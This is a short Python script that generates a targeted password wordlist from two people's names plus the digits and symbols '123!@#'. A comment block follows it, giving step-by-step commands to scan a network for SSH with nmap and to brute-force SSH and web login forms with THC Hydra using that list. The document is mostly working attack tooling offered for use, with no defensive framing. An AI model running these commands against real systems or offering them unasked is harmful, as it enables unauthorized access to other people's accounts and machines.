#!/usr/bin/python
from itertools import combinations
import argparse
'''
    Author: Rajmani Arya
    Date: 29 Feb 2016
'''
parser = argparse.ArgumentParser()
parser.add_argument('user', nargs=2, help="provide two lowercase single names, i,e either first, middle or last")
args = parser.parse_args()
name1 = args.user[0]
name2 = args.user[1]
items = list(combinations('123!@#', 3))
items = items + list(combinations('123!@#',2))
items = items + list(combinations('123!@#',1))
items.append(('',))

f = open('pass.txt', 'w')
for item in items:
    f.write(name1.title()+''.join(item))
    f.write("\n")
    f.write(name1+''.join(item))
    f.write("\n")
    f.write(name2+''.join(item))
    f.write("\n")
    f.write(name2.title()+''.join(item))
    f.write("\n")
    f.write(name1+name2[0].title()+''.join(item))
    f.write("\n")
    f.write(name2[0]+name1.title()+''.join(item))
    f.write("\n")
    f.write(name2+name1[0].title()+''.join(item))
    f.write("\n")
    f.write(name1[0]+name2.title()+''.join(item))
    f.write("\n")

f.close()

'''
    Tools Required:
        OS: Ubuntu
        Environment: Python, nmap, THC Hydra
    Generate Password
    -----------------------------------------------------------
    python password.py user1 user2  // generate pass.txt
    -----------------------------------------------------------
    After Generating Dictionary Password, Start Password Attack
    -----------------------------------------------------------
    for ssh attack
    -----------------------------------------------------------
    Scan Entire Network for 22 port
        $ ifconfig
            it gives you IPv4 address e.g 172.30.102.xxx
        $ nmap -p 22 172.30.102.0/24
            it will give all ip's active within the network for ssh
    Select a Particular IPv4 address
        $ nmap -A -T4 IPv4_Address
            it may give you pc name if you don't know pc name or user
            if you user username and pc name then skip this step
    Attack
        $ hydra -l (root or username) -P pass.txt -t 4 IPv4_address ssh
    -------------------------------------------------------------
    Http-Form Attacks
    -------------------------------------------------------------
    Find Login Post url of a website...
    e.g <form action="/auth/login.php" method="post">
    then base_url is website_url and login_url is '/auth/login.php'
    if action="" or not defined then login_url is the page_url itself
    e.g you are at www.example.com/auth/login and form action in none
    then base_url is www.example.com and login_url is /auth/login
    Now Attack----
        $ hydra -l username -P pass.txt (www.example.com or IPv4) -t 4 -V http-post-form "login_url:username=^USER^&password=^PASS^:S=success"
'''
